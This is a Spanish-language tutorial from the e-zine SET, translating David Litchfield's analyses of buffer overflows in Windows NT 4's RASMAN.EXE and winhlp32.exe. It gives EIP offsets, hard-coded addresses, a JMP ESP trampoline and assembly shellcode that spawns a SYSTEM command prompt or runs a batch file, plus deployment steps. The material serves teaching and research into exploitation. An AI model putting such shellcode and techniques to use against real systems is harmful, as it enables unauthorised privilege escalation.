@@ -1,0 +1,842 @@
+-[ 0x0D ]--------------------------------------------------------------------
+-[ Buffer Overflows : Rasman & Winhlp32 ]------------------------------------
+-[ by FCA00000 ]------------------------------------------------------SET-22-
+
+
+    FCA00000 nos envia la version en castellano del estudio de estos
+    dos overflows en entorno Windows.
+   
+    --   Original work by		     --
+    --   David Litchfield                    --
+    --   http://www.infowar.co.uk/mnemonix   --
+    --   http://www.arca.com                 --
+
+
+   1)    RASMAN.EXE    
+   2)    WINHLP32.EXE  
+
+
+
+ 1-)
+
+
+         Aprovechando Buffer Overflow en Windows NT 4
+         --------------------------------------------
+
+      Estudio del caso: RASMAN.EXE
+
+   Introduccion
+   ------------
+
+Este documento solo tiene proposito educativo y explica lo que es un buffer
+overflow y muestra c¢mo pueden ser aprovechados en el sistema operativo
+WindowsNT 4 usando RASMAN.EXE como ejemplo. Se miraran los procesos de NT,
+el espacio de direccionamiento virtual, el funcionamiento de un buffer
+overflow, y ciertos temas claves tales como explicar lo que es la pila y
+los registros ESP, EBP y lo que hacen. Con esto, explicaremos el overflow que
+hay en RASMAN.EXE, y como aprovecharlo.
+Este documento puede ser copiado y distribuido libremente unicamente en su
+totalidad, y mencionando a su autor.
+
+Que es un buffer overflow?
+
+Un buffer overflow sucede cuando un programa reserva un bloque de memoria
+de una longitud dada, y luego trata de guardar demasiados datos en esa zona,
+sobreescribiendo y alterando posiblemente informacion critica para la normal
+ejecucion del programa.
+
+Considerar el siguiente trozo de codigo fuente:
+
+#include <stdio.h>
+int main()
+{
+char    nombre[31];
+printf("Escriba su nombre: ");
+gets(nombre);
+printf("Hola, %s", nombre);
+return 0;
+}
+
+Cuando se compila este codigo, y se crea un programa, y se ejecuta, se asigna
+un bloque de memoria de 32 bytes para almacenar el nombre. En circunstancias
+normales se escribiria un nombre, por ejempo "David", y el programa imprimiria
+en la pantalla
+"Hola, David"
+Como "David" ocupa 5 caracteres, cada letra ocupa un byte. ademas, el
+finalizador de string \0 se llama terminador nulo. Asi que la longitud total
+es de 6 bytes. Esta claro que 6 bytes caben dentro de los 31 bytes previstos
+para almacenar el nombre. Pero si, por ejemplo, en vez de "David", escribimos
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+es decir, 40 veces la letra 'A', cuando el programa lee este dato y lo pone en
+nuestro buffer 'nombre', lo sobrepasa. Definitivamente 40 no cabe en 32.
+
+Lo que sucede es que si metemos 40 'A' sobreescribimos el contenido de un
+registro de la CPU llamado Extended Instruction Pointer o EIP.
+Este registro contiene la direccion de memoria de la siguiente instruccion
+a ejecutar. Asi que cuando se ejecuta el programa y el microprocesador esta
+ejecutando una instruccion, EIP tiene la direccion de memoria donde esta la
+siguiente instruccion a ejecutarse. Cuando la instruccion ha sido procesada, 
+el microprocesador va a esa direccion de memoria, toma la instruccion, 
+incrementa EIP y ejecuta la instruccion. Y asi sucesivamente.
+
+Volviendo a nuestro codigo, el hecho de haber sobreescrito EIP significa que
+podemos decirle a la CPU que vaya a la direccion que queramos, y seguir
+ejecutando instrucciones en esa posicion. Dado que estamos llenando el buffer
+con 'A' en realidad llenamos EIP con 0x41414141, pues 41 es el valor hex
+de la letra 'A'. El procesador salta a la direccion 0x41414141 e intenta
+ejecutar la instruccion en dicha direccion. Si no hay una instruccion valida
+se produce una violacion de acceso. La mayoria de las veces se obtiene una
+ventana indicando "La instruccion en 0x41414141 hace referencia a la posicion
+de memoria 0x41414141. La memoria no se puede leer'
+Si hubieramos rellenado el buffer con 'B' habiamos sobreescrito EIP con el
+valor 0x42424242, diciendole al procesador que fuera a esa direccion de
+memoria para obtener la siguiente direccion, y posiblemente tendriamos el
+mismo tipo de violacion de acceso.
+
+Aprovechando el Buffer Overflow
+
+Como veremos luego, ser capaz de sobreescribir EIP es fundamental para
+aprovechar el Buffer Overflow. Cuando se saca provecho de esto, basicamente
+se hace que el microprocesador ejecute instrucciones de codigo de tu eleccion
+para que el programa haga algo que en condiciones normales no haria. La
+manera de hacerlo es apuntando EIP otra vez al buffer que has rellenado con
+tu propio codigo, que entonces se ejecutan. Esto lleva a la pregunta, "Para
+que querria alguien hacer esto?"
+
+WindowsNT, como los sistemas UNIX, requieren que un usuario entre en el
+sistema. Algunos usuarios son muy potentes, tales como Administrador, mientras 
+que otros son usuarios normales menos potentes. Si un usuario quiere ser
+equivalente al Administrador y, por tanto, tan potente, con pleno control
+sobre el sistema, podria aprovecharse de un Buffer Overflow para conseguirlo.
+el problema esta en que el Buffer Overflow necesita estar en un proceso que
+tenga suficiente poder y provilegio para ser capaz de crear otro Administrador
+asi que no hay utilidad ninguna en usar un Buffer Overflow en un proceso que
+un usuario normal ha ejecutado. Es necesario aplicarlo en un proceso
+ejecutado por el sistema (usuario System), y hacer que ejecute nuestro propio
+codigo. La cuenta System es muy potente, y si puedes conseguir que un proceso
+de sistema ejecute algo, tal como un Command Prompt, entonces se ejecutara
+con privilegios de System. En WindowsNT, si un proceso arranca un proceso
+hijo, entonces el hijo normalmente herada el testigo de privilegios del
+proceso padre, normalmente porque algunos procesos pueden ser creados usando
+la funcion de Win32 CreateProcessAsUser() que arrancara el nuevo proceso
+con el entorno de seguridad de otro usuario, y asi el nuevo proceso tendra
+un testigo de acceso diferente que el del padre. Un testigo de acceso es
+como un manojo de llaves - denotan los derechos de un usuario y los
+privilegios que determinan lo que puede hacer la maquina y lo que no. Un
+ejemplo son los salvapantallas. El proceso de sistema winlogon.exe es
+responsable de arrancar el salvapantallas del usuario. En vez de ejecutar el
+salvapantallas en el entorno se seguridad del sistema, winlogon usa
+CreateProcessAsUser() para ejecutar el salvapantallas en el contexto de
+seguridad del usuario que usa el ordenador en ese momento. Pero me estoy
+yendo por las ramas; volvemos al Buffer Overflow. 
+
+En este estudio nos centraremos en el Buffer Overflow existente en RASMAN.EXE
+y haremos que nos abra una ventana de comandos de WindowsNT. 
+Esa ventana tendra el testigo de acceso de la cuenta System, y tambien
+cualquier proceso ejecutado desde esta ventana.
+Pero primero vamos a echar una ojeada al esquema de memoria virtual de un
+proceso.
+
+Un proceso aglutina muchas cosas tales como un programa en ejecucion, una
+o mas hebras de ejecucion (threads), el espacio de memoria virtual, y las
+librerias de enlace dinamico (DLL) que el programa usa. El proceso
+tiene 4 GB de espacio de direcciones virtuales para usar. La mitad de estas,
+desde 0x00000000 hasta 0x7FFFFFFF es el espacio de direcciones privadas
+donde estan el programa, sus DLLs y la pila (o las pilas en caso de un
+programa multihebra) , y la otra mitad, desde 0x80000000 hasta 0xFFFFFFFF,
+es el espacio de direcciones del sistema donde hay cosas como el NTOSKRNL.EXE
+(el kernel) y el HAL (Hardware Abstraction Layer - los drivers). Este
+comportamiento se puede cambiar con el Service Pack 3; puedes especificar en
+el boot.ini  /3GB , que asigne 3 GB para espacio virtual y 1 Gb para
+espacio del sistema. Esto se usa para aumentar el rendimiento de algunos
+programas, tales como bases de datos, que requieren gran cantidad de memoria.
+
+Cuando un programa se ejecuta, NT crea un nuevo proceso. Carga las
+instrucciones y las DLLs que el programa usa en el espacio de direcciones
+privadas, y marca las paginas que usa como de solo-lectura. Cualquier intento
+de modificar paginas en memoria de solo lectura causa una violacion de acceso.
+Entonces se arranca la primera hebra, y se inicializa la pila.
+
+La pila
+
+Cual es la manera de describir la pila? Intenta esto: imagina un carpintero.
+tiene herramientas, materiales e instrucciones. Para poder construir algo
+necesita una mesa de trabajo. La pila es similar a esta mesa. Es un sitio
+donde puede usar sus herramientas para dar forma y modelar los materiales.
+Puede dejar algo en la mesa, por ejemplo para esperar que la cola pegue dos
+trozos de madera, y hacer mientras otra cosa. Cuando se finaliza la tarea
+vuelve a sus dos trozos de madera y continua trabajando con ellos. La mesa
+es donde se hace la mayor parte del trabajo.
+Igualmente, en un proceso, la pila es donde se hacen la mayoria de las cosas.
+Es un area de memoria escribible que dinamicamente se expande y decrece segun
+se necesite o venga determinada por la ejecucion del programa. Cuando una
+parte de programa empieza pone datos en la pila, ya sean cadenas, direcciones
+de memoria, numero, o lo que sea; luego los manipula y cuando la tarea ha
+sido completada pondra la pila en su estado original para que la siguiente
+tarea la use si quiere. Este metodo de trabajo hace que los procesos operen
+con la pila usando un mecanismo conocido como Last In, First Out; LIFO.
+Hay dos registros que son cruciales para la funcionalidad de la pila; los usa
+el programa para mantener un indicador de donde se encuentran los datos en
+la memoria. Estos dos registros son ESP y EBP.
+
+El ESP Stack Pointer apunta a la parte superior de la pila. El ESP contiene
+la direccion de memoria donde se encuentra la parte superior de la pila.
+El ESP se puede cambiar de varias maneras, tnato directa como indirectamente.
+Cuando algo se mete ne la pila -PUSH- el ESP se incrementa. cuando algo se
+saca de la pila -POP- en ESP disminuye. Las instrucciones PUSH y POP modifican
+el ESP indirectamente. Pero tambien se puede manipular directamente, por
+ejemplo con instrucciones del tipo "SUB ESP, 04h" que corre la pila hacia
+abajo 4 bytes, esto es, una palabra. Para aquellos que se empiezan a tirar
+de los pelos, una aclaracion: ?Como es posible que restas 4 del ESP, y ESP
+se mueve hacia abajo? Pues porque la pila trabaja de atras hacia delante.
+
+La parte baja de la pila usa una direccion de memoria mayor que la parte alta:
+
+-----0x12121212 cima de la pila
+...
+...
+-----0x121212FF parte baja de la pila
+
+Aqui tenemos la pruaba definitiva de que os padres de la computacion moderna
+realmente sadicos radicales o tenian el cerabro inmerso en paracetamol; de
+vez en cuando crean joyas asi para que el dolor de cabeza sea mas fuerte.
+Cuando el tama~o de la pila crece, entonces el valor de ESP decrece.
+Y viceversa, cuando el tama~o de la pila decrece, ESP se incrementa.
+Tienes ya la aspirina?
+
+
+El segundo registro que tiene que ver con la pila es EBP o Base Pointer.
+El EBP contiene la direccion de memoria de la parte baja de la pila. Mas
+exactamente apunta a un punto de la base de la pila que podemos usar como
+referencia para cualquier tarea de programacion. El EBP debe tener sentido
+para una tarea y para facilitar esto, antes de que empieze la rutina a hacer
+su tarea, se ejecuta un procedimiento de inicializacion conocido como
+"prologo de procedimiento". Lo que se hace es, primero, guardar el actual EBP
+metiendolo en la pila. Asi el programa y el procesador saben donde encontrarlo
+cuando la tarea actual haya acabado. Luego el ESP se copia en EBP, creando asi
+un nuevo Base Pointer que la tarea en ejecucion puede usar como un punto de
+referencia aunque ESP cambie durante la ejecucion de la tarea. Por ejemplo,
+digamos que una cadenas de 11 caracteres se mete en la pila - nuestro EBP
+permanece el mismo pero ESP ha sido modificado en 12 bytes. digamos que
+entonces un puntero se mete en la pila - nuestro EBP se decrementa otros 4
+bytes, aunque EBP permenece el mismo. Digamos que ahora necesitamos
+referenciar la cadena de 11 bytes - podemos hacerlo usando nuestro EBP;
+sabemos que el primer byte de nuestra cadena (el puntero a ella) esta 12 bytes
+mas alla del EBP, asi que podemos referenciar este puntero a la cadena
+diciendo "la direccion encontrada en EBP menos 12". Recordar que la pila
+va desde una direccion mas alta hacia otra mas baja.
+
+
+
+RASMAN y buffer overflow
+-------------------------
+
+Encontrando el buffer overflow
+
+La primera cosa que necesitas para ser capaz de usar un buffer overflow es
+
+a) conocer uno que existe o
+b) encontrar uno tu mismo.
+
+En el caso de RASMAN, el sobrepasamiento se encuentra buscando las
+funciones RAS y las estructuras que usan. Notar que algunas de las funciones,
+tal como RasGetDialParams(), rellenan estructuras que contienen vectores de
+caracteres, muy parecidos al vector de caracteres  char nombre[31] de
+ejemplo en C anterior. Jugueteando con el archivo rasphone.pbk , el Listin
+Telefonico del RAS, donde se guardan parametros de llamadas, tales como el
+numero de telefono que se marca, puedes aprovecharte de este sobrepasamiento.
+Haz un listin telefonico llamado "Internet", que llama a tu proveedor, llama,
+y bajate tu correo. Esto es importante para a~adir al registro (Registry)
+una entrada para el nombre de dominio de tu servidor de correo como de
+tipo Autodial. Esto es; a partir de ahora, si intentas contactar con tu
+servidor de correo, si no estas conectado a Internet, el gestor de conexiones
+(Connection Manager) saltara y llamara automaticamente por ti. RASMAN es el
+proceso que se encarga de esta funcionalidad. Una vez que has hecho esto,
+cambia el numero de telefono a una cadenas grande de A's e intenta conectar
+a tu servidor de correo, por ejemplo arrancando el Outlook Express.
+Esto fuerza a RASMAN a leer el numero de telefono desde rasphone.pbk para
+poder contactar con el servidor de correo. Pero en vez del numero de telefono
+de verdad, se lee una cadena de muchas A's y se llena un vector de caracteres
+en la estructura RAS_DIAL_PARAMS que se sobrepasa causando una violacion de
+acceso en la direccion 0x41414141. Hemos encontrado un buffer overflow y, lo
+mas excitante, hemos sobreescrito el registro EIP.
+
+Encontrando donde se sobrepasa ESP
+----------------------------------
+
+Experimentando con la longitud del "numero de telefono" encontramos que
+sobreescribimos EIP con los bytes en las posiciones 296, 297, 298 y 299 de
+nuestra cadena. Notaras que, si estas siguiendo estas instrucciones, tienes
+que reiniciar el sistema tras el solapamiento del buffer para ser capaz de
+reestablecer el servicio, y que tienes que parar otras tareas tales como
+el Athena Window y msmin.exe). Una vez que hemos encontrado donde escribimos
+EIP es la hora de arrancar el debugger; la capacidad de debug del Visual C++
+son muy buenas.
+Arranca el proceso RASMAN y haz que llame, o al menos que lo intente. Espera
+hasta que se produzca la violacion de acceso.
+
+
+Analizar lo que pasa.
+
+Una vez que ha ocurrido la violacion de acceso necesitamos mirar la pila y
+el estado de los registros de la CPU. De esto podemos ver que tambien hemos
+sobreescrito EBP, lo que vendra bien mas tarde, y que la direccion de
+nuestra primera 'A' de nuestro numero de telefono es 0x015DF105. Haciendo
+que RASMAN falle unas cuantas veces encontramos que la primera 'A' siempre se
+escribe en esa direcion. Esta es la direccion a la que vamos a poner EIP para
+que el procesador mire en esa direccion la siguiente instruccion que
+ejecutara. Guardaremos el "numero de telefono" con nuestros codigos para
+conseguir que RASMAN haga lo que nosotros queremos: nuestro propio codigo.
+entonces nos preguntamos: "que queremos que haga?"
+
+
+
+Adonde quieres ir hoy? - Que quieres conseguir?
+-----------------------------------------------
+
+La mejor cosa que se puede hacer, dado que necesitamos estar en la consola
+para que esto funcione, es conseguir que RASMAN abra una ventana de comandos.
+Desde aqui podemos ejecutar cualquier programa que queramos con privilegios
+de sistema. El modo mas facil de conseguir que un programa ejecute una
+ventana de comandos, o cualquier otro programa similar, es usar la
+funcion system(). Cuando se llama a esta funcion se mira el valor de la
+variable de entorno COMSPEC, normalmente "c:\winnt\system32\cmd.exe" en
+WindowsNT y lo ejecuta con el parametro "/C". La funcion le pasa a cmd.exe
+un comando a jecutar y la opcion "/C" le dice a cmd.exe que salga cuando el
+comando haya finalizado. Si pasamos "cmd.exe" como comando: system("cmd.exe")
+esto hace que la funcion system abra cmd.exe con la opcion "/C" y ejecute
+cmd.exe; asi que estamos ejecutando dos instancias del interprete de comandos,
+pero el segundo no acaba hasta que se lo decimos (y tampoco acaba el primero
+hasta que lo ha hecho el segundo).
+En vez de poner los codigos que forman la funcion system() en nuestra cadena
+que aprovecha el overflow, seria mas sencillo simplemente llamarla. cuando
+llamas a una funcion le dices al programa que vaya a una cierta DLL que
+contiene el codigo para la funcion que estas llamando. El uso de DLLs
+significa que lo programas pueden ocupar menos; en lugar de que cada programa
+contenga el codigo necesario para cada funcion usada, pueden llamar a una DLL
+compartida que es la que contiene el codigo. las DLLs se dice que exportan
+funciones, esto es, la DLL proporciona una direccion donde se encuentra una
+funcion. La DLL tambien tiene una direccion base para que el sistema sepa
+donde encontrar esa DLL. Cuando se carga una DLL en el espacio de direcciones
+del proceso siempre se encontrara en esa direccion base y las funciones que
+exporta se localizan en un punto de entrada en relacion con la direccion base.
+La funcion system() es exportada en msvcrt.dll (la libreria de ejecucion
+en Runtime de Microsoft Visual C++) cuyo punto de entrada se encuentra
+en 000208C3 (al menos en la version 5.00.7303 de msvcrt.dll), lo que significa
+que la direccion de la funcion system() es 0x780208C3. Esperemos que
+msvcrt.dll ya este cargado en el espacio de direcciones de RASMAN.EXE. Si no
+fuera asi necesitariamos usar LoadLibrary() y GetProcAdddress(). Por suerte
+RASMAN usa msvcrt.dll asi que esta ya en el espacio de direcciones del proceso.
+Esto hace el trabajo de aprovechar el buffer overflow muy facil; simplemente
+construir una pila con nuestra cadena conteniendo el comando a
+ejecuter (cmd.exe) y ya lo podemos llamar. Y lo que todavia es mejor es que
+la direccion 0x780208C3 no tiene nulls (00). Los caracteres null complican
+el tema.
+Para averiguar como tiene que ser la pila necesitamos mirar como es cuando un
+programa normal llama a system("cmd.exe"); necesitamos escribir uno que lo
+haga y desensamblarlo. Necesitamos que nuestro codigo construya una imagen
+duplicada de la pila tal como aparece en este programa antes de que se
+llame a system(). Este es el codigo del programa. Compilar y linkar usando
+kernel32.lib y desensamblalo.
+
+<++> bugs/rasman
+
+@include <windows.h>
+#include <winbase.h>
+
+typedef void (*MYPROC) (LPTSTR);
+int main()
+{
+HINSTANCE LibHandle;
+MYPROC ProcAdd;
+
+char dllbuf[11] = "msvcrt.dll";
+char sysbuf[7]  = "system";
+char cmdbuf[8]  = "cmd.exe";
+
+LibHandle = LoadLibrary(dllbuf);
+
+ProcAdd = (MYPROC) GetProcAddress( LibHandle, sysbuf);
+(ProcAdd) (cmdbuf);
+return 0;
+}
+<-->
+
+Desensamblando y examinando la pila antes de que se llame a system() [que
+es (ProcAdd)(cmdbuf) en el programa anterior] vemos que en la cima de la
+pila encontramos direccion de la 'c' de "cmd.exe", luego la direccion
+de la funcion system(), luego la cadena "cmd.exe" y otras cosas que no son
+importantes. Asi que para emular esto necesitamos la cadena "cmd.exe" en la
+pila, luego la direccion de la funcion system() y luego la direccion que
+apunta a nuestra cadena "cmd.exe". Aqui hay un esquema de como tiene que ser
+la pila antes de llamar a system()
+
+---------------- ESP (cima de la pila)
+XX
+XX
+XX
+XX
+C3
+08
+02
+78
+63   c
+6D   m
+64   d
+2E   .
+65   e
+78   x
+65   e
+00   \0
+---------------- EBP (parte baja de la pila)
+
+donde las 4 'XX' superiores son la direccion de 'c'. No necesitamos escribir
+a mano esta direccion en nuestra cadena que aprovecha el buffer overflow porque
+podemos usar EBP como una referencia, recordar que es el puntero base. Mas
+tarde veras que cargamos la direccion donde esta el primer byte de la
+cadena "cmd.exe" en un registro usando EBP como punto de referencia.
+
+
+Escribiendo el codigo ensamblador
+
+Asi es como tiene que ser la pila cuando llamemos a system(). Como lo
+conseguimos? Tenemos que contruirlo nosotros mismo con nuestros codigos - no
+se puede poner simplemente en nuestra cadena porque hay caracteres null y
+eso no puede ser. Dado que tenemos que construirlo es bueno tener unos pocos
+conocimientos de ensamblador. Lo primero que necesitamos es poner ESP
+apuntando a una direccion que podamos usar como pila. (Recordar que ESP
+apunta a la cima de la pila.) PAra hacer esto usamos:
+mov esp. ebp
+Esto copia EBP en ESP; sobreescribimos EBP ademas de EIP, lo que es realmente
+conveniente. sobreescribimos EBP con una direccion en la que sabemos que
+podemos escribir - usaremos 0x15DF124. Consecuentemente ESP, despues de haber
+sido copiado con EBP, la cima de la pila estara en 0x15DF124.
+queremos entonces meter EBP en l pila. Esa es nuestra direccion de retorno.
+push ebp
+Esto tiene el efecto de bajar ESP en 4 bytes asi que ESP vale ahora 0x15DF120.
+Tras esto queremos meter ESP en EBP
+mov ebp, esp
+Esto completa el prologo del procedimiento. Con esto podemos empezar a
+construir la pila para que sea como queremos.
+Lo siguiente que necesitamos hacer es meter varios null en la pila. Los
+necesitamos porque necesitamos que nuestra cadena cmd.exe acabe con un null.
+aunque la cadena cmd.exe todavia no esta alli, lo estara, pero tenemos que
+hacer las cosas en orden inverso. antes de que podamos meter nulls en a pila
+necesitamos generarlos. Lo hacemos con un XOR de un registro consigo mismo.
+Usaremos el registro EDI
+xor edi, edi
+Esto pone EDI a 00000000 y luego lo metemos en la pila con
+push edi
+Esto tiene el efecto adicional de poner ESP a 0x015DF11C. Pero "cmd.exe" mide
+7 bytes, y solo tenemos espacio para 4 bytes, y luego necesitaremos un null al 
+final de nuestra cadena, asi que le quitamos otros 4 bytes a ESP para
+conseguir un total de 8 bytes de espacio entre ESP y EBP. Podriamos "push edi"
+otra vez, pero, por variar, simplemente decrementaremos ESP en 4
+sub esp, 04h
+Nuestro ESP vale ahora 0x015DF118 y nuestro EBP vale 0x015DF120. Nuestra
+siguiente tarea es escribir cmd.exe en la pila. Para hacer esto usaremos EBP
+como punto de referencia y escribiremos 63 (valor hexadecmal de 'c') en
+la direcion de EBP menos 8
+
+mov byte ptr [ebp-08h], 63h
+Hacemos lo mismo para 'm', 'd',  '.',  'e',  'x',  'e'
+mov byte ptr [ebp-07h], 6Dh
+mov byte ptr [ebp-06h], 64h
+mov byte ptr [ebp-05h], 2Eh
+mov byte ptr [ebp-04h], 65h
+mov byte ptr [ebp-03h], 78h
+mov byte ptr [ebp-02h], 65h
+
+Ahora la pila tiene este aspecto
+
+--------- ESP
+63  c
+6D  m
+64  d
+2E  .
+65  e
+78  x
+65  e
+00
+--------- EBP
+
+Todo lo que tenemos que hacer ahora es poner la direccion de system() en la
+pila y un puntero a nuestra cadena cmd.exe sobre ella. Una vez hecho esto
+llamaremos a la funcion system()
+Sabemos que la funcion system() se exporta en la direccion 0x780208C3 asi que
+movemos esto a un registro y lo metemos en la pila:
+mov eax, 0x780208C3
+push eax
+Ahora queremos poner la direccion de nuestra 'c' en la pila. Sabemos que se
+encuentra 8 bytes mas alla de EBP, asi que cargamos la direccion con 8 bytes
+menos de EBP en un registro
+lea eax, [ebp-08h]
+El registro EAX contiene ahora la direccion donde comienza la cadena "cmd.exe"
+Queremos ponerlo en la pila
+push eax
+con esto nuestra pila esta completa y estamos listos para llamar a system()
+pero no la llamamos directamente; otra vez usamos la indireccion usando
+nuestro EBP como punto de referencia y llamamos a la direccion encontrada
+en EBP menos 12 (esto es 0C en hexadecimal)
+
+La siguiente cosa que hay que hacer es probar el codigo en ensamblador para
+ver si funciona, asi que necesitamos escribir un programa que use la
+funcion __asm, la cual toma codigo en ensamblador y lo incorpora en un
+programa en C. como llamamos a system() que se exporta en msvcrt.dll,
+necesitamos cargarlo usando la funcion LoadLibrary(). Si no, nuestra funcion
+fallaria:
+
+Cuando se ejecuta deberia arrancar una ventana de interprete de comandos 
+cmd.exe.  Habra una violacion de acceso  porque hemos estado jugando
+con la pila y no lo hemos limpiado correctamente. Entonces ya esta.
+Este es nuestro codigo y todo lo que nos queda por hacer
+ahora es ponerlo en rasphone.pbk como nuestro numero de telefono. Pero antes
+de poder hacer esto, necesitas los codigos para el programa en ensamblador
+anterior.
+Esto es relativamente facil; simplemente desensambla el programa que has
+compilado y consigue los codigos. Deberias tener
+"8B E5" para "mov esp, ebp" y
+"55" para "push ebp" y etc etc...
+
+Cuando tengas todos los codigos necesitamos ponerlos en nuestro "numero de
+telefono". Pero no podemos escribir los codigos facilmente con el Notepad.
+Lo mas facil es escribir otro programa que cree un archivo rasphone.pbk con
+el numero de telefono lleno con nuestro codigo.
+
+
+
+Probando todo
+
+A menudo, cuando se trata de aprovechar un Buffer Overflow no funciona la
+primera vez, normalmente debido a algo que pasas por alto o similar. El
+codigo de este documento ha sido probado en NT Server 4 con SP 3,
+NT Server 4 con SP 4, y NT Workstation 4 con SP 3, todo en un Pentium, y
+funciona, lo cual no quiere decir que seguro que funciona en tu maquina.
+Puede haber muchas razones por las que no va, pero queda de tu parte el
+encontrar la razon. Asi que vamos a probarlo.
+
+Para hacerlo funcionar hay que efectuar los siguientes pasos:
+
+1) Haz copia de respaldo de tu propio rasphone.pbk y borra el original.
+   Los permisos NTFS de este archivo por defecto le dan a everybody la
+   capacidad de cambio, asi que no deberias tener problemas con esto
+
+2) Ejecuta rasphone (Inicio->Ejecutar->rasphone->OK). Deberias obtener un
+   mensaje diciendo que tu listin telefonico esta vacio y pulsar OK para
+   crear uno nuevo.
+
+3) Pulsa OK y crea una nueva entrada llamandola "Internet". Escribe la
+   informacion pertinente para llamar a tu ISP, y llama.
+
+4) Una vez conectado arranca Outlook Express y recoge tu correo. La razon
+   para hacer esto es que creara una entrada en el Registry para el nombre
+   del servidor de correo y lo asociara como una direccion auto-llamable.
+   Si la conexion  de Outlook Express es de tipo "llamada" cambialo a LAN,
+   en el apartado de propiedades de cuentas de correo.
+
+5) Cuelga y cierra Outlook Express.
+
+6) Borra el recien creado rasphone.pbk y reemplazalo por el que has hecho
+   con el programa anterior.
+
+7) abre Outlook Express.
+
+Dado que no estas conectado a Internet RASMAN automaticamente deberia llamar
+por ti, leer del Registry la informacion de auto-llamada y entonces
+abrir rasphone.pbk, llenar sus buffers y sobrepasarlos. Mas o menos en 8
+segundos se abrira una ventana de interprete de comandos. Esta ventana
+tiene privilegios de system.
+
+Y esto es todo. Hemos aprovechado un buffer overflow y ejecutado nuestro
+propio codigo.
+
+
+
+
+
+2-)       Analisis del buffer overflow de winhlp32.exe
+          --------------------------------------------
+
+El buffer overflow de winhlp32.exe sucede cuando intenta leer un archivo
+de tipo CNT con una cabecera demasiado larga. Si la cadena mide mas de 507
+bytes el buffer NO se llena; winhlp32.exe simplemente acorta el dato.
+Si se produce el overflow, la direccion de retorno se sobreescribe con lo
+bytes de las posiciones 357, 358, 359 y 360.
+Todo lo que hay antes de esos bytes se pierde, con lo que se puede jugar
+con los bytes 361-507; esto es, un total de 147 bytes para nuestro propio
+codigo. Probando probando se descubre que tambien se pierden 20 de estos
+bytes, con lo que solo quedan 127 para operar. No mucho.
+
+Al llenar el buffer y analizando el contenido de la memoria y los registros
+de la CPU con un debugger encontramos que el byte 361 se escribe en la
+direccion 0x0012F0E4. Esta es la direccion a la que necesitamos que vaya el
+microprocesador. Pero esta direccion contiene un NULL, lo que fastidia
+totalmente el asunto. Mirando mas atentamente los registros vemos que tambien
+el Stack Pointer ESP tiene esta direccion, asi que si encontramos algun
+lugar en la memoria que haga un JMP ESP, y ponemos la direccion de retorno
+a esto, entonces seremos capaces de volver a la direccion donde pongamos
+nuestro codigo.
+Mirando las DLLs que usa winhlp32.exe encontramos que kernel32.dll tiene la
+instruccion JMP ESP en 0x77F327E5 (kernel32.lib del Service Pack 4), y en
+la direccion 0x77F327D5 del Service Pack - kernel32.dll.
+
+Asi que ponemos 0x77F327E5 en los bytes 357 al 360, pero tenemos que
+guardarlos en orden inverso, asi que ponemos 0xE5 en el byte 357,
+el byte 358 a 0x27, el byte 359 a 0xF3, y el byte 360 a 0x77.
+
+Ahora que hemos saltado a nuestro codigo tenemos que decidir que queremos
+poner para que haga. Como solo tenemos 127 bytes necesitamos arrancar otro
+programa. Lo mejor es un programa BAT
+Esto implica llamar a la funcion system(), la cual es exportada en msvcrt.dll
+que desafortunadamente no esta cargada todavia, asi que tenemos que hacerlo.
+La manera es llamar a LoadLibrary(), que se exporta en kernel32.dll, que si
+esta en memoria.
+LoadLibraryA() se exporta en la direccion 0x77F1381A, asi que lo que hacemos
+es guardar "msvcrt.dll" en algun lugar de nuestra memoria y llamar a
+0x77F1381A con una referencia a esta cadena. Asi que nuestro codigo escribira
+en memoria.
+Una vez hecho esto ponemos la direccion de LoadLibraryA() en la pila, poner
+la direccion del puntero a "msvcrt.dll", y llamar a LoadLibraryA() usando
+un offset desde el EBP. Este es el codigo ASM para hacerlo:
+
+
+   /* primero el prologo del procedimiento */
+   push ebp
+   mov ebp,esp
+
+   /* necesitamos varios 0s */
+   xor eax,eax
+
+   /* los metemos en la pila */
+   push eax
+   push eax
+   push eax
+
+   /* escribimos MSVCRT.DLL en la pila */
+   mov byte ptr[ebp-0Ch],4Dh
+   mov byte ptr[ebp-0Bh],53h
+   mov byte ptr[ebp-0Ah],56h
+   mov byte ptr[ebp-09h],43h
+   mov byte ptr[ebp-08h],52h
+   mov byte ptr[ebp-07h],54h
+   mov byte ptr[ebp-06h],2Eh
+   mov byte ptr[ebp-05h],44h
+   mov byte ptr[ebp-04h],4Ch
+   mov byte ptr[ebp-03h],4Ch
+
+   /* ponemos la direccion de LoadLibraryA ( ) en el registro EDX */
+   mov edx,0x77F1381A
+
+   /* lo metemos en el stack */
+   push edx
+
+   /* cargamos la direccion donde esta la cadena msvcrt.dll */
+   lea eax,[ebp-0Ch]
+
+   /* y lo metemos en la pila */
+   push eax
+
+   /* finalmente llamamos a LoadLibraryA( ) */
+   call dword ptr[ebp-10h]
+
+Si todo va bien deberiamos tener cargado msvcrt.dll en el espacio de
+direcciones de winhlp32.exe. Ahora necesitamos llamar a system() y darle el
+nombre de un archivo BAT como argumento. Como no tenemos suficientes bytes
+para jugar con la llamada GetProcessAddress() y hacer el resto de las
+cosas (como por ejemplo, limpiar la pila), tenemos que averiguar que version
+tenemos de msvcrt.dll antes de escribir nuestro codigo.
+En una instalacion standard de WindowsNT es la version 4.20.6201, y la
+funcion system se exporta en 0x7801E1E1. Haremos que llame al archivo ADD.BAT
+pero para ahorrar espacio no lo llamamos con extension. La funcion system()
+primero buscara la extension .exe, luego .com y finalmente .bat , asi que lo
+encontrara por nosotros y lo ejecutara. Entonces el proceso cmd.exe saldra.
+
+Asi que necesitamos una cadena acabada en null en memoria, con el valor ADD,
+y la direccion de la funcion system(). Este es el codigo:
+
+   /* primero el prologo del procedimiento */
+   push ebp
+   mov ebp,esp
+
+   /* necesitamos algunos NULL, y los metemos en la pila */
+   xor edi,edi
+   push edi
+
+   /* escribimos "ADD" en la pila */
+   mov byte ptr [ebp-04h],41h
+   mov byte ptr [ebp-03h],44h
+   mov byte ptr [ebp-02h],44h
+
+   /* ponemos la direccion de system() en EAX, y lo metemos en la pila */
+   mov eax, 0x7801E1E1
+   push eax
+
+   /* cargamos EAX con la direccion de "ADD" y tambien lo metemos */
+   lea eax,[ebp-04h]
+   push eax
+
+   /* llamamos a system() */
+   call dword ptr [ebp-08h]
+
+Cuando el archivo BAT se ejecuta, el Interprete de Comandos acaba, pero si
+no limpiamos la pila, winhlp32.exe provocara una violacion de acceso, asi
+que tenemos que llamar a exit(0) para salir limpiamente.
